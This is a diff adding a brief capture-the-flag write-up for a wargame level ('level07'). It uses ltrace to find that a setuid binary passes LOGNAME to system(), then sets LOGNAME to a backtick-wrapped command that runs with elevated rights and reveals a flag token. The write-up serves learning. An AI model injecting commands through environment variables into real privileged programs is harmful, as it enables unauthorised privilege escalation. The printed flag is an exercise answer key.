@@ -1,0 +1,17 @@
+we can see that in home directory of  Level07 there is executable file with name level07 that has permission of the user flag07
+
+ltrace : intercepts and records dynamic library calls which are called by an executed process and the signals received by that process.
+
+$>ltrace ./Level07
+[...]                                              = 0
+getenv("LOGNAME")                                                                                  = "level07"
+asprintf(0xbffff704, 0x8048688, 0xbfffff36, 0xb7e5ee55, 0xb7fed280)                                = 18
+system("/bin/echo level07 "level07
+[...]
+
+we see that we getenv("LOGNAME") and we write the values using echo so we gonna change the `LOGNAME` value to '`getflag`' and run level07 again.
+
+$>export LOGNAME='`getflag`'
+$>./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
